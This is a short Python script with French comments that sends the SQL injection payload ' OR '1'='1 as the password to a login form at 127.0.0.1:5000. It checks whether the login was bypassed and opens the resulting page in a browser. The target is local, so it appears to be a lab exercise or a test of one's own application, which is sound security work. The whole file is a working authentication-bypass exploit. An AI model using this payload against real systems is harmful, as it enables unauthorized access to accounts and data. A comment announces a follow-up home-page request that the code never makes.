import requests
import webbrowser
import tempfile
import os

# URL de la page de connexion
url = 'http://127.0.0.1:5000/login'
payload = {
    'username': 'bob',
    'password': "' OR '1'='1"
}

# Envoyer la requête POST pour tenter l'injection SQL
response = requests.post(url, data=payload)

# Vérifier si la requête a été réussie
if response.status_code == 200:
    # Vérifier si on est redirigé vers la page d'accueil
    if 'Invalid credentials' not in response.text:
        print("Injection SQL réussie. Affichage de la page d'accueil.")
        
        # Requête pour obtenir la page d'accueil après la connexion réussie
        
        # Vérifier si la requête de la page d'accueil a été réussie
        if response.status_code == 200:
            # Créer un fichier temporaire pour afficher le contenu
            with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as f:
                f.write(response.content)
                temp_file_path = f.name
            
            # Ouvrir le fichier temporaire dans le navigateur par défaut
            webbrowser.open(f'file://{os.path.realpath(temp_file_path)}')
        else:
            print("Erreur lors de l'accès à la page d'accueil")
    else:
        print("L'application semble sécurisée contre cette forme d'injection SQL.")
else:
    print(f"Erreur : {response.status_code}")



